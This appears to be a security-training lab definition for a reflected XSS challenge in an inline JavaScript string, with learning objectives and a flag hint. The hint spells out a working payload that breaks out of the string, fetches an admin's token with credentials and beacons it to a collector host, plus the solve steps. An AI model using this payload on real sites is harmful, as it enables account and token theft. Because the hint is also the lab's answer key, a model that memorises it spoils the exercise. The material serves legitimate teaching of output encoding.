title: Reflected XSS in a JavaScript String Literal
learning_objectives: Recognise a reflected XSS sink where user input lands inside an inline JavaScript string literal, not an HTML element body
Break out of a single-quoted JS string with a quote and comment out the trailing source with //
Explain why an HTML-only filter (angle-bracket stripping) is the wrong encoder for a JavaScript-string context and provides no protection there
Escalate injected JavaScript into a same-origin credentialed fetch that reads an admin-only token and beacons it out-of-band
Identify context-aware output encoding (JS-string escaping / JSON-encoding) as the correct fix versus a naive character blacklist
flag_hint: Put ';fetch('/api/whoami',{credentials:'include'}).then(function(r){return r.text()}).then(function(t){new Image().src='http://collector:9000/report?w='+encodeURIComponent(t)});// in ?promo (URL-encoded) and submit that path to POST /report. Arrows won't work — the filter strips every > (including the one in =>), so use function(){} expressions. The admin bot runs it; its whoami token beacons to the collector. Read GET /oob/received, then POST /solve {"c":"<32 hex>"}.
tech_stack: vanilla JS (reflected into an inline JS-string literal)
inspired_by: The canonical PortSwigger 'Reflected XSS into a JavaScript string with angle brackets HTML-encoded' lab pattern, abstracted for local Docker with a Playwright victim bot and an OOB collector
